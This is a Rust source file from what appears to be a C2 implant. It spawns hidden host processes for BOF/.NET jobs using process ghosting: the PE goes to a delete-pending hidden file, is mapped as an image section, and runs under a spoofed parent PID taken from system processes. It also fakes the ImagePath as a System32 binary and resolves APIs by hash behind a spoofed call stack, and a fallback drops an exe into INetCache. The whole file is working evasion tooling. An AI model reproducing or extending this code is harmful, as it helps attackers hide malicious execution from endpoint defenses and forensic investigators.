//! Zero-residual host spawn for isolated BOF/.NET.
//!
//! Primary (x64): process-ghost style + **true PPID**
//!   delete-pending file → NtCreateSection(SEC_IMAGE) → close file (path gone)
//!   → open preferred parent (pool) → **NtCreateProcessEx(ParentProcess=parent, Section=host)**
//!   → RtlCreateProcessParametersEx (pipes + spoofed ImagePath) → NtCreateThreadEx(entry)
//!
//! Note: NtCreateProcessEx's 4th argument *is* the kernel parent (EPROCESS.InheritedFrom).
//! Passing CURRENT_PROCESS made every ghost child a child of the agent — fixed here.
//!
//! Fallback: delete-on-close CreateProcessW + existing PPID attribute path
//! Last resort: caller uses classic temp write path.
//!
//! The **job payload** (BOF/.NET) still travels only on the pipe — never as a host file.

#![cfg(all(windows, target_arch = "x86_64"))]

use std::os::windows::ffi::OsStrExt;
use std::ptr;

use crate::native::spawn::SpoofedPipedChild;
use crate::stealth;

const SEC_IMAGE: u32 = 0x0100_0000;
const SECTION_ALL_ACCESS: u32 = 0x000F_001F;
const PAGE_READONLY: u32 = 0x02;
const FILE_SHARE_READ: u32 = 0x01;
const FILE_SHARE_WRITE: u32 = 0x02;
const FILE_SHARE_DELETE: u32 = 0x04;
const FILE_ATTRIBUTE_TEMPORARY: u32 = 0x100;
const FILE_ATTRIBUTE_HIDDEN: u32 = 0x2;
const FILE_SUPERSEDE: u32 = 0;
const FILE_SYNCHRONOUS_IO_NONALERT: u32 = 0x20;
const FILE_NON_DIRECTORY_FILE: u32 = 0x40;
const FILE_DELETE_ON_CLOSE: u32 = 0x0000_1000;
const OBJ_CASE_INSENSITIVE: u32 = 0x40;
const PROCESS_ALL_ACCESS: u32 = 0x001F_FFFF;
const THREAD_ALL_ACCESS: u32 = 0x001F_FFFF;
const MEM_COMMIT: u32 = 0x1000;
const MEM_RESERVE: u32 = 0x2000;
const PAGE_READWRITE: u32 = 0x04;
const HANDLE_FLAG_INHERIT: u32 = 0x1;
const PROCESS_CREATE_FLAGS_INHERIT_HANDLES: u32 = 0x4;
// DELETE | GENERIC_READ | GENERIC_WRITE | SYNCHRONIZE (practical mask for write+section)
const FILE_ACCESS_RW_DELETE: u32 = 0x0001_0000 | 0x8000_0000 | 0x4000_0000 | 0x0010_0000;
const DUPLICATE_SAME_ACCESS: u32 = 0x0000_0002;

#[repr(C)]
struct UnicodeString {
    length: u16,
    maximum_length: u16,
    _pad: u32,
    buffer: *mut u16,
}

#[repr(C)]
struct ObjectAttributes {
    length: u32,
    _pad0: u32,
    root_directory: usize,
    object_name: *mut UnicodeString,
    attributes: u32,
    _pad1: u32,
    security_descriptor: usize,
    security_quality_of_service: usize,
}

#[repr(C)]
struct IoStatusBlock {
    status: i32,
    _pad: u32,
    information: usize,
}

#[repr(C)]
struct ProcessBasicInformation {
    exit_status: i32,
    _pad0: u32,
    peb_base: usize,
    affinity: usize,
    base_priority: i32,
    _pad1: u32,
    unique_process_id: usize,
    inherited_from: usize,
}

/// Preferred fake parents (same pool as isolated_exec / spawn fallbacks).
const PARENT_POOL: &[&str] = &[
    "RuntimeBroker.exe",
    "sihost.exe",
    "taskhostw.exe",
    "svchost.exe",
    "explorer.exe",
    "dllhost.exe",
];

/// Try to spawn `pe` with no residual on-disk host image + PPID spoof. Returns piped child.
pub fn spawn_host_zero_disk(pe: &[u8], parent_name: &str) -> Result<SpoofedPipedChild, String> {
    if pe.len() < 0x200 || pe[0] != b'M' || pe[1] != b'Z' {
        return Err("not a PE".into());
    }
    crate::stealth::stack::with_spoofed_stack(|| {
        // Prefer ghost section path with real ParentProcess handle
        match unsafe { ghost_section_spawn(pe, parent_name) } {
            Ok(c) => {
                crate::db_print!(
                    "[host] zero-disk: section+PPID ok pid={} parent~{}",
                    c.pid, parent_name
                );
                return Ok(c);
            }
            Err(e) => {
                crate::db_print!("[host] section+PPID failed: {e}");
            }
        }
        // Fallback: delete-on-close CreateProcess (PPID via PROC_THREAD_ATTRIBUTE)
        match unsafe { delete_on_close_createprocess(pe, parent_name) } {
            Ok(c) => {
                crate::db_print!(
                    "[host] zero-residual: delete-on-close+PPID CreateProcess ok"
                );
                Ok(c)
            }
            Err(e) => Err(format!("zero-disk paths failed: {e}")),
        }
    })
}

/// Open a parent process for PPID: preferred name then pool.
fn open_ppid_parent(preferred: &str) -> Result<(usize, &'static str), String> {
    let mut tried = Vec::new();
    let mut names: Vec<&str> = Vec::with_capacity(PARENT_POOL.len() + 1);
    names.push(preferred);
    for p in PARENT_POOL {
        if !p.eq_ignore_ascii_case(preferred) {
            names.push(*p);
        }
    }
    // PROCESS_CREATE_PROCESS | PROCESS_DUP_HANDLE | PROCESS_QUERY_LIMITED_INFORMATION
    let access = crate::native::PROCESS_CREATE_PROCESS | 0x0040 | 0x1000;
    for name in names {
        tried.push(name);
        if let Some(pid) = crate::native::find_pid_by_name(name).filter(|p| *p != 0) {
            if let Ok(h) = crate::native::open_process(pid, access) {
                // Leak static str: only from PARENT_POOL or copy preferred into pool match
                let label: &'static str = PARENT_POOL
                    .iter()
                    .find(|p| p.eq_ignore_ascii_case(name))
                    .copied()
                    .unwrap_or("explorer.exe");
                return Ok((h, label));
            }
        }
    }
    Err(format!("no parent openable ({})", tried.join(",")))
}

unsafe fn ghost_section_spawn(pe: &[u8], parent_name: &str) -> Result<SpoofedPipedChild, String> {
    let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
    if ntdll == 0 {
        return Err("ntdll missing".into());
    }

    // --- pipes ---
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    type CreatePipeFn = unsafe extern "system" fn(*mut usize, *mut usize, *mut u8, u32) -> i32;
    type SetHandleInformationFn = unsafe extern "system" fn(usize, u32, u32) -> i32;
    let create_pipe: CreatePipeFn = transmute_api(k32, b"CreatePipe")?;
    let set_hi: SetHandleInformationFn = transmute_api(k32, b"SetHandleInformation")?;

    #[repr(C)]
    struct Sa {
        n: u32,
        sd: usize,
        inherit: i32,
    }
    let mut sa = Sa {
        n: std::mem::size_of::<Sa>() as u32,
        sd: 0,
        inherit: 1,
    };
    let mut stdin_r = 0usize;
    let mut stdin_w = 0usize;
    let mut stdout_r = 0usize;
    let mut stdout_w = 0usize;
    if create_pipe(&mut stdin_r, &mut stdin_w, &mut sa as *mut _ as *mut u8, 0) == 0 {
        return Err("CreatePipe stdin".into());
    }
    if create_pipe(
        &mut stdout_r,
        &mut stdout_w,
        &mut sa as *mut _ as *mut u8,
        0,
    ) == 0
    {
        let _ = crate::native::close_handle(stdin_r);
        let _ = crate::native::close_handle(stdin_w);
        return Err("CreatePipe stdout".into());
    }
    let _ = set_hi(stdin_w, HANDLE_FLAG_INHERIT, 0);
    let _ = set_hi(stdout_r, HANDLE_FLAG_INHERIT, 0);

    // --- delete-pending temp file + write PE + SEC_IMAGE section ---
    let (section, tmp_path) = match create_image_section_from_pe(pe) {
        Ok(v) => v,
        Err(e) => {
            cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
            return Err(e);
        }
    };

    // --- Parent for true kernel PPID (NtCreateProcessEx ParentProcess handle) ---
    let (parent_handle, parent_label) = match open_ppid_parent(parent_name) {
        Ok(v) => v,
        Err(e) => {
            let _ = crate::native::close_handle(section);
            cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
            let _ = std::fs::remove_file(&tmp_path);
            return Err(e);
        }
    };

    // --- NtCreateProcessEx(ParentProcess = spoofed parent, SectionHandle = host image) ---
    type NtCreateProcessExFn = unsafe extern "system" fn(
        *mut usize,
        u32,
        usize,
        usize, // ParentProcess — NOT "current process" if we want PPID spoof
        u32,
        usize,
        usize,
        usize,
        u32,
    ) -> i32;
    let nt_create_process_ex: NtCreateProcessExFn = transmute_api(ntdll, b"NtCreateProcessEx")?;

    let mut h_process: usize = 0;
    let st = nt_create_process_ex(
        &mut h_process,
        PROCESS_ALL_ACCESS,
        0,
        parent_handle, // true PPID: InheritedFromUniqueProcessId ← this process
        PROCESS_CREATE_FLAGS_INHERIT_HANDLES,
        section,
        0,
        0,
        0,
    );
    let _ = crate::native::close_handle(section);
    let _ = crate::native::close_handle(parent_handle);
    if st < 0 || h_process == 0 {
        cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
        let _ = std::fs::remove_file(&tmp_path);
        return Err(format!(
            "NtCreateProcessEx 0x{:08X} (parent={})",
            st as u32, parent_label
        ));
    }

    // Image base + entry from remote PEB
    let entry = match remote_entry_point(h_process, pe) {
        Ok(e) => e,
        Err(e) => {
            let _ = crate::native::close_handle(h_process);
            cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
            return Err(e);
        }
    };

    // CRITICAL: NtCreateProcessEx(ParentProcess=spoofed) + INHERIT_HANDLES inherits
    // handles from RuntimeBroker/etc., NOT from the agent. Agent-local pipe handle
    // values written into ProcessParameters are invalid in the child → CRT dies on
    // first stdin read → agent WriteFile gets broken pipe (err 109/232).
    // Inject real pipe ends into the child via DuplicateHandle, then write those
    // *remote* handle values into RTL_USER_PROCESS_PARAMETERS.
    let (remote_stdin, remote_stdout) =
        match duplicate_pipes_into_child(h_process, stdin_r, stdout_w) {
            Ok(v) => v,
            Err(e) => {
                let _ = crate::native::close_handle(h_process);
                cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
                return Err(e);
            }
        };

    // Process parameters: spoofed ImagePath + child-valid std handles
    if let Err(e) = write_process_parameters(
        h_process,
        ntdll,
        remote_stdin,
        remote_stdout,
        remote_stdout,
        parent_label,
    ) {
        let _ = crate::native::close_handle(h_process);
        cleanup_four(stdin_r, stdin_w, stdout_r, stdout_w);
        return Err(e);
    }

    // Local child-end copies are no longer needed; remote copies live in the child.
    let _ = crate::native::close_handle(stdin_r);
    let _ = crate::native::close_handle(stdout_w);

    type NtCreateThreadExFn = unsafe extern "system" fn(
        *mut usize,
        u32,
        usize,
        usize,
        usize,
        usize,
        u32,
        usize,
        usize,
        usize,
        usize,
    ) -> i32;
    let nt_create_thread_ex: NtCreateThreadExFn = transmute_api(ntdll, b"NtCreateThreadEx")?;
    let mut h_thread: usize = 0;
    let st = nt_create_thread_ex(
        &mut h_thread,
        THREAD_ALL_ACCESS,
        0,
        h_process,
        entry,
        0,
        0,
        0,
        0,
        0,
        0,
    );
    if st < 0 || h_thread == 0 {
        let _ = crate::native::close_handle(h_process);
        // stdin_r / stdout_w already closed; only agent-side ends remain
        let _ = crate::native::close_handle(stdin_w);
        let _ = crate::native::close_handle(stdout_r);
        return Err(format!("NtCreateThreadEx 0x{:08X}", st as u32));
    }
    let _ = crate::native::close_handle(h_thread);

    let pid = query_pid(h_process).unwrap_or(0);
    let _ = std::fs::remove_file(&tmp_path); // usually already gone

    Ok(SpoofedPipedChild {
        pid,
        h_process,
        stdin_write: stdin_w,
        stdout_read: stdout_r,
    })
}

/// Duplicate agent-local pipe ends into `h_child` so ProcessParameters can reference
/// handles that are valid inside the sacrificial host.
unsafe fn duplicate_pipes_into_child(
    h_child: usize,
    stdin_r: usize,
    stdout_w: usize,
) -> Result<(usize, usize), String> {
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    type DuplicateHandleFn =
        unsafe extern "system" fn(usize, usize, usize, *mut usize, u32, i32, u32) -> i32;
    let dup: DuplicateHandleFn = transmute_api(k32, b"DuplicateHandle")?;

    let mut remote_stdin = 0usize;
    let mut remote_stdout = 0usize;
    // bInheritHandle=FALSE: already injected; no further inheritance needed.
    if dup(
        crate::native::CURRENT_PROCESS,
        stdin_r,
        h_child,
        &mut remote_stdin,
        0,
        0,
        DUPLICATE_SAME_ACCESS,
    ) == 0
    {
        return Err(format!(
            "DuplicateHandle stdin→child failed (pipe would be invalid in host)"
        ));
    }
    if dup(
        crate::native::CURRENT_PROCESS,
        stdout_w,
        h_child,
        &mut remote_stdout,
        0,
        0,
        DUPLICATE_SAME_ACCESS,
    ) == 0
    {
        // Best-effort: leave remote_stdin in child; process will be torn down by caller.
        return Err(format!(
            "DuplicateHandle stdout→child failed (pipe would be invalid in host)"
        ));
    }
    if remote_stdin == 0 || remote_stdout == 0 {
        return Err("DuplicateHandle returned null remote pipe handle".into());
    }
    Ok((remote_stdin, remote_stdout))
}

/// Create SEC_IMAGE section from PE bytes using a delete-pending file (ghost prep).
unsafe fn create_image_section_from_pe(pe: &[u8]) -> Result<(usize, std::path::PathBuf), String> {
    let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
    let path = {
        let mut d = std::env::temp_dir();
        let a = crate::utils::next_u32_secure();
        let b = crate::utils::next_u32_secure();
        d.push(format!("~TG{:08X}{:04X}.tmp", a, b & 0xffff));
        d
    };
    let nt_path = to_nt_path(&path)?;

    let mut name_buf: Vec<u16> = nt_path;
    let mut us = UnicodeString {
        length: ((name_buf.len() - 1) * 2) as u16,
        maximum_length: (name_buf.len() * 2) as u16,
        _pad: 0,
        buffer: name_buf.as_mut_ptr(),
    };
    let mut oa = ObjectAttributes {
        length: std::mem::size_of::<ObjectAttributes>() as u32,
        _pad0: 0,
        root_directory: 0,
        object_name: &mut us,
        attributes: OBJ_CASE_INSENSITIVE,
        _pad1: 0,
        security_descriptor: 0,
        security_quality_of_service: 0,
    };
    let mut iosb = IoStatusBlock {
        status: 0,
        _pad: 0,
        information: 0,
    };
    let mut h_file: usize = 0;

    type NtCreateFileFn = unsafe extern "system" fn(
        *mut usize,
        u32,
        *mut ObjectAttributes,
        *mut IoStatusBlock,
        *mut i64,
        u32,
        u32,
        u32,
        u32,
        usize,
        u32,
    ) -> i32;
    let nt_create_file: NtCreateFileFn = transmute_api(ntdll, b"NtCreateFile")?;

    let st = nt_create_file(
        &mut h_file,
        FILE_ACCESS_RW_DELETE,
        &mut oa,
        &mut iosb,
        ptr::null_mut(),
        FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        FILE_SUPERSEDE,
        FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT | FILE_DELETE_ON_CLOSE,
        0,
        0,
    );
    if st < 0 || h_file == 0 {
        return Err(format!("NtCreateFile 0x{:08X}", st as u32));
    }

    // Mark delete-pending explicitly (belt + suspenders with DELETE_ON_CLOSE)
    #[repr(C)]
    struct FileDispositionInfo {
        delete_file: u8,
    }
    let mut disp = FileDispositionInfo { delete_file: 1 };
    type NtSetInformationFileFn =
        unsafe extern "system" fn(usize, *mut IoStatusBlock, *mut u8, u32, u32) -> i32;
    if let Ok(nt_set) = transmute_api::<NtSetInformationFileFn>(ntdll, b"NtSetInformationFile") {
        // FileDispositionInformation = 13
        let _ = nt_set(
            h_file,
            &mut iosb,
            &mut disp as *mut _ as *mut u8,
            std::mem::size_of::<FileDispositionInfo>() as u32,
            13,
        );
    }

    type NtWriteFileFn = unsafe extern "system" fn(
        usize,
        usize,
        usize,
        usize,
        *mut IoStatusBlock,
        *const u8,
        u32,
        *mut i64,
        usize,
    ) -> i32;
    let nt_write: NtWriteFileFn = transmute_api(ntdll, b"NtWriteFile")?;
    let mut off: i64 = 0;
    let st = nt_write(
        h_file,
        0,
        0,
        0,
        &mut iosb,
        pe.as_ptr(),
        pe.len() as u32,
        &mut off,
        0,
    );
    if st < 0 {
        let _ = crate::native::close_handle(h_file);
        return Err(format!("NtWriteFile 0x{:08X}", st as u32));
    }

    type NtCreateSectionFn =
        unsafe extern "system" fn(*mut usize, u32, usize, *mut i64, u32, u32, usize) -> i32;
    let nt_create_section: NtCreateSectionFn = transmute_api(ntdll, b"NtCreateSection")?;
    let mut h_section: usize = 0;
    let mut max_size: i64 = 0;
    let st = nt_create_section(
        &mut h_section,
        SECTION_ALL_ACCESS,
        0,
        &mut max_size,
        PAGE_READONLY,
        SEC_IMAGE,
        h_file,
    );
    // Close file → path should vanish (delete-pending / delete-on-close)
    let _ = crate::native::close_handle(h_file);
    if st < 0 || h_section == 0 {
        return Err(format!("NtCreateSection 0x{:08X}", st as u32));
    }
    Ok((h_section, path))
}

unsafe fn remote_entry_point(h_process: usize, pe: &[u8]) -> Result<usize, String> {
    let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
    type NtQueryInformationProcessFn =
        unsafe extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32;
    let nt_qip: NtQueryInformationProcessFn = transmute_api(ntdll, b"NtQueryInformationProcess")?;
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut ret = 0u32;
    // ProcessBasicInformation = 0
    let st = nt_qip(
        h_process,
        0,
        &mut pbi as *mut _ as *mut u8,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut ret,
    );
    if st < 0 || pbi.peb_base == 0 {
        return Err(format!("NtQueryInformationProcess 0x{:08X}", st as u32));
    }

    // PEB.ImageBaseAddress at +0x10 on x64
    let mut image_base: usize = 0;
    type NtReadVirtualMemoryFn =
        unsafe extern "system" fn(usize, usize, *mut u8, usize, *mut usize) -> i32;
    let nt_rvm: NtReadVirtualMemoryFn = transmute_api(ntdll, b"NtReadVirtualMemory")?;
    let mut nread = 0usize;
    let st = nt_rvm(
        h_process,
        pbi.peb_base + 0x10,
        &mut image_base as *mut _ as *mut u8,
        8,
        &mut nread,
    );
    if st < 0 || image_base == 0 {
        return Err(format!("read ImageBase 0x{:08X}", st as u32));
    }

    let entry_rva = pe_address_of_entry_point(pe)?;
    Ok(image_base + entry_rva)
}

fn pe_address_of_entry_point(pe: &[u8]) -> Result<usize, String> {
    if pe.len() < 0x40 {
        return Err("pe short".into());
    }
    let e_lfanew = u32::from_le_bytes(pe[0x3c..0x40].try_into().unwrap()) as usize;
    if pe.len() < e_lfanew + 0x28 + 4 {
        return Err("pe nt short".into());
    }
    // OptionalHeader.AddressOfEntryPoint at +0x28 from NT headers start (after PE\0\0 + file header 20 = +24, wait)
    // IMAGE_NT_HEADERS64: Signature 4 + FileHeader 20 + OptionalHeader starts at +24
    // AddressOfEntryPoint is at OptionalHeader + 16 = NT + 40 = e_lfanew + 0x28
    let off = e_lfanew + 0x28;
    let rva = u32::from_le_bytes(pe[off..off + 4].try_into().unwrap()) as usize;
    if rva == 0 {
        return Err("zero entry".into());
    }
    Ok(rva)
}

unsafe fn write_process_parameters(
    h_process: usize,
    ntdll: usize,
    stdin_h: usize,
    stdout_h: usize,
    stderr_h: usize,
    parent_name: &str,
) -> Result<(), String> {
    // RtlCreateProcessParametersEx — spoof ImagePath to a common System32 binary
    // matching the PPID parent family when possible.
    let image = match parent_name.to_ascii_lowercase().as_str() {
        "sihost.exe" => r"C:\Windows\System32\sihost.exe",
        "taskhostw.exe" => r"C:\Windows\System32\taskhostw.exe",
        "svchost.exe" => r"C:\Windows\System32\svchost.exe",
        "dllhost.exe" => r"C:\Windows\System32\dllhost.exe",
        "explorer.exe" => r"C:\Windows\explorer.exe",
        _ => r"C:\Windows\System32\RuntimeBroker.exe",
    };
    let mut image_w: Vec<u16> = std::ffi::OsStr::new(image)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let mut dll_w: Vec<u16> = std::ffi::OsStr::new(r"C:\Windows\System32")
        .encode_wide()
        .chain(std::iter::once(0))
        .collect();
    let mut us_image = UnicodeString {
        length: ((image_w.len() - 1) * 2) as u16,
        maximum_length: (image_w.len() * 2) as u16,
        _pad: 0,
        buffer: image_w.as_mut_ptr(),
    };
    let mut us_dll = UnicodeString {
        length: ((dll_w.len() - 1) * 2) as u16,
        maximum_length: (dll_w.len() * 2) as u16,
        _pad: 0,
        buffer: dll_w.as_mut_ptr(),
    };

    type RtlCreateProcessParametersExFn = unsafe extern "system" fn(
        *mut usize,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        usize,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        *mut UnicodeString,
        u32,
    ) -> i32;
    let rtl_cpp: RtlCreateProcessParametersExFn =
        transmute_api(ntdll, b"RtlCreateProcessParametersEx")?;

    let mut params: usize = 0;
    // Flags: RTL_USER_PROC_PARAMS_NORMALIZED = 1
    let st = rtl_cpp(
        &mut params,
        &mut us_image,
        &mut us_dll,
        ptr::null_mut(),
        &mut us_image, // command line = image
        0,
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        ptr::null_mut(),
        1,
    );
    if st < 0 || params == 0 {
        return Err(format!("RtlCreateProcessParametersEx 0x{:08X}", st as u32));
    }

    // Standard handles offsets in RTL_USER_PROCESS_PARAMETERS (x64 Win10+):
    // ConsoleHandle 0x50? — actually:
    // 0x20 MaximumLength, 0x28 Length, ... ImagePathName UNICODE at ~0x60
    // StandardInput at 0x20 on older — use known Win10 x64 layout:
    // StandardInput  = 0x20  NO — that's wrong for normalized.
    // Public layout (x64):
    // +0x00 MaximumLength
    // +0x08 Length
    // +0x10 Flags
    // ...
    // +0xA0 StandardInput
    // +0xA8 StandardOutput
    // +0xB0 StandardError
    // These offsets vary; write via fields if Length is large enough.
    let stdin_off = 0xA0usize;
    let stdout_off = 0xA8usize;
    let stderr_off = 0xB0usize;
    // params is local process pointer from Rtl*
    let p = params as *mut u8;
    ptr::write_unaligned(p.add(stdin_off) as *mut usize, stdin_h);
    ptr::write_unaligned(p.add(stdout_off) as *mut usize, stdout_h);
    ptr::write_unaligned(p.add(stderr_off) as *mut usize, stderr_h);

    // Copy parameters block into remote process
    let local_len = ptr::read_unaligned(p.add(0) as *const u32) as usize; // MaximumLength
    let copy_len = local_len.max(0x100).min(0x2000);

    type NtAllocateVirtualMemoryFn =
        unsafe extern "system" fn(usize, *mut usize, usize, *mut usize, u32, u32) -> i32;
    let nt_avm: NtAllocateVirtualMemoryFn = transmute_api(ntdll, b"NtAllocateVirtualMemory")?;
    let mut remote_base: usize = 0;
    let mut region = copy_len;
    let st = nt_avm(
        h_process,
        &mut remote_base,
        0,
        &mut region,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE,
    );
    if st < 0 || remote_base == 0 {
        type RtlDestroyProcessParametersFn = unsafe extern "system" fn(usize) -> i32;
        if let Ok(d) =
            transmute_api::<RtlDestroyProcessParametersFn>(ntdll, b"RtlDestroyProcessParameters")
        {
            let _ = d(params);
        }
        return Err(format!(
            "NtAllocateVirtualMemory params 0x{:08X}",
            st as u32
        ));
    }

    type NtWriteVirtualMemoryFn =
        unsafe extern "system" fn(usize, usize, *const u8, usize, *mut usize) -> i32;
    let nt_wvm: NtWriteVirtualMemoryFn = transmute_api(ntdll, b"NtWriteVirtualMemory")?;
    let mut nw = 0usize;
    let st = nt_wvm(h_process, remote_base, p, copy_len, &mut nw);
    if st < 0 {
        return Err(format!("NtWriteVirtualMemory params 0x{:08X}", st as u32));
    }

    // PEB.ProcessParameters at +0x20 x64
    type NtQueryInformationProcessFn =
        unsafe extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32;
    let nt_qip: NtQueryInformationProcessFn = transmute_api(ntdll, b"NtQueryInformationProcess")?;
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut ret = 0u32;
    let st = nt_qip(
        h_process,
        0,
        &mut pbi as *mut _ as *mut u8,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut ret,
    );
    if st < 0 {
        return Err("PEB query failed".into());
    }
    let st = nt_wvm(
        h_process,
        pbi.peb_base + 0x20,
        &remote_base as *const _ as *const u8,
        8,
        &mut nw,
    );
    if st < 0 {
        return Err(format!("write PEB.ProcessParameters 0x{:08X}", st as u32));
    }

    type RtlDestroyProcessParametersFn = unsafe extern "system" fn(usize) -> i32;
    if let Ok(d) =
        transmute_api::<RtlDestroyProcessParametersFn>(ntdll, b"RtlDestroyProcessParameters")
    {
        let _ = d(params);
    }
    Ok(())
}

unsafe fn query_pid(h_process: usize) -> Option<u32> {
    let ntdll = stealth::get_module_base(stealth::hash_module_name(b"ntdll.dll"));
    type NtQueryInformationProcessFn =
        unsafe extern "system" fn(usize, u32, *mut u8, u32, *mut u32) -> i32;
    let nt_qip: NtQueryInformationProcessFn =
        transmute_api(ntdll, b"NtQueryInformationProcess").ok()?;
    let mut pbi: ProcessBasicInformation = std::mem::zeroed();
    let mut ret = 0u32;
    let st = nt_qip(
        h_process,
        0,
        &mut pbi as *mut _ as *mut u8,
        std::mem::size_of::<ProcessBasicInformation>() as u32,
        &mut ret,
    );
    if st < 0 {
        return None;
    }
    Some(pbi.unique_process_id as u32)
}

/// Fallback: CreateProcess with DELETE_ON_CLOSE file — no residual path after start.
unsafe fn delete_on_close_createprocess(
    pe: &[u8],
    parent_name: &str,
) -> Result<SpoofedPipedChild, String> {
    let path = {
        let mut d = if let Ok(l) = std::env::var("LOCALAPPDATA") {
            std::path::PathBuf::from(l)
                .join("Microsoft")
                .join("Windows")
                .join("INetCache")
        } else {
            std::env::temp_dir()
        };
        let _ = std::fs::create_dir_all(&d);
        let a = crate::utils::next_u32_secure();
        d.push(format!("~DF{:08X}.exe", a));
        d
    };
    std::fs::write(&path, pe).map_err(|e| format!("write: {e}"))?;

    // Open with DELETE_ON_CLOSE so path dies when all handles close
    type CreateFileWFn =
        unsafe extern "system" fn(*const u16, u32, u32, usize, u32, u32, usize) -> usize;
    let k32 = stealth::get_module_base(stealth::hash_module_name(b"kernel32.dll"));
    let create_file: CreateFileWFn = transmute_api(k32, b"CreateFileW")?;
    let wide: Vec<u16> = path.as_os_str().encode_wide().chain(Some(0)).collect();
    // GENERIC_READ | DELETE, OPEN_EXISTING, FILE_FLAG_DELETE_ON_CLOSE
    let h_hold = create_file(
        wide.as_ptr(),
        0x8000_0000 | 0x0001_0000,
        FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
        0,
        3,                                                              // OPEN_EXISTING
        0x0400_0000 | FILE_ATTRIBUTE_TEMPORARY | FILE_ATTRIBUTE_HIDDEN, // DELETE_ON_CLOSE
        0,
    );
    if h_hold == 0 || h_hold == usize::MAX {
        let _ = std::fs::remove_file(&path);
        return Err("CreateFile DELETE_ON_CLOSE failed".into());
    }

    let cmdline = format!("\"{}\"", path.display());
    let child = crate::native::spawn::spawn_spoofed_piped_result(&cmdline, parent_name);
    // Drop our hold — image section keeps process alive; path should disappear
    let _ = crate::native::close_handle(h_hold);
    let _ = std::fs::remove_file(&path);

    child.map_err(|e| e)
}

fn to_nt_path(path: &std::path::Path) -> Result<Vec<u16>, String> {
    let abs = path
        .canonicalize()
        .or_else(|_| {
            // file may not exist yet — build absolute manually
            let mut a = std::env::current_dir().unwrap_or_default();
            a.push(path);
            Ok::<_, std::io::Error>(a)
        })
        .map_err(|e| e.to_string())?;
    let s = abs.to_string_lossy();
    // \\?\C:\... or C:\... → \??\C:\...
    let stripped = s.strip_prefix(r"\\?\").unwrap_or(&s);
    let nt = format!(r"\??\{}", stripped);
    Ok(std::ffi::OsStr::new(&nt)
        .encode_wide()
        .chain(std::iter::once(0))
        .collect())
}

unsafe fn transmute_api<T>(module: usize, name: &[u8]) -> Result<T, String> {
    let addr = stealth::get_api_addr(module, stealth::hash_api_name(name))
        .ok_or_else(|| format!("resolve {}", String::from_utf8_lossy(name)))?;
    Ok(std::mem::transmute_copy(&addr))
}

fn cleanup_four(a: usize, b: usize, c: usize, d: usize) {
    let _ = crate::native::close_handle(a);
    let _ = crate::native::close_handle(b);
    let _ = crate::native::close_handle(c);
    let _ = crate::native::close_handle(d);
}
